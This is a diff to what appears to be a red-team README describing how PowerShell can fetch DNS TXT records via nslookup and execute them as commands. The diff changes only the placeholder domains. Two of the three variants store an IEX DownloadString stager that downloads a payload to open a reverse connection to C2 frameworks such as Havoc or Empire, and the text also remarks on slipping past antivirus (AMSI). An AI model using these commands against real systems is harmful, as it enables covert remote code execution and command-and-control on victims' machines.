@@ -1,7 +1,7 @@
 ### Variant 0.1
 Commands are stored as TXT entries on a DNS server and requested via nslookup (a.k.a "nshookup").<br><br>
 Client executing:.<br>
-`powershell (nslookup -q=txt domain.com)[5]`<br><br>
+`powershell (nslookup -q=txt bad-domain.com)[5]`<br><br>
 DNS Server entry:<br>
 `ping google.com`<br><br>
 *EXPLANATION: nslookup.exe calls the TXT entry through DNS as subprocess from powershell. This way the stored commands get transmitted over DNS and executed in the context of the current (powershell) process. The number in the brackets stands for the index (five being the first possible one) of the command. It is also possible to use "[-1]" should there be only a single command available as TXT entry.*<br><br>
@@ -14,7 +14,7 @@ The outcome is `powershell ping google.com` being executed in the current sessio
 ### Variant 0.2
 -> Commands are stored as TXT entries on a DNS server to host a payload/stager for a  reverse connection to a C2 server (Havoc, Empire, etc.).<br><br>
 Client executing:<br>
-`powershell (nslookup -q=txt domain.com)[5]`<br><br>
+`powershell (nslookup -q=txt bad-domain.com)[5]`<br><br>
 DNS Server entry:<br>
 `IEX (New-Object Net.WebClient).DownloadString('http:/server/payload.html')`<br><br>
 *EXPLANATION: Again, the TXT enty is interpreted as legitimate command through parent & child process being powershell and a DNS request respectively.
@@ -27,10 +27,10 @@ This request will most likely trigger AV (AMSI). If "IEX" doesn't get caught, th
 ### Variant 0.3
 -> Commands are stored as TXT entries on a domain1.com to host another nslookup command requesting entries from domain2.com.<br><br>
 Client executing:<br>
-`powershell (nslookup -q=txt domain1.com)[5]`<br><br>
+`powershell (nslookup -q=txt bad-domain.com)[5]`<br><br>
 DNS Server entry (the index may vary):<br>
-`powershell (nslookup -q=txt domain2.com)[5]`<br><br>
-DNS Server TXT entry on domain2.com:<br>
+`powershell (nslookup -q=txt bad-domain2.com)[5]`<br><br>
+DNS Server TXT entry on bad-domain_2.com:<br>
 `IEX (New-Object Net.WebClient).DownloadString('http:/server/payload.html')`<br><br>
 *EXPLANATION: The commands can be chained together with a combination of dns servers. The client requests the first domain, which in return requests the actual commands.on the second server.*<br>
 This will most likely trigger AV (AMSI).<br>
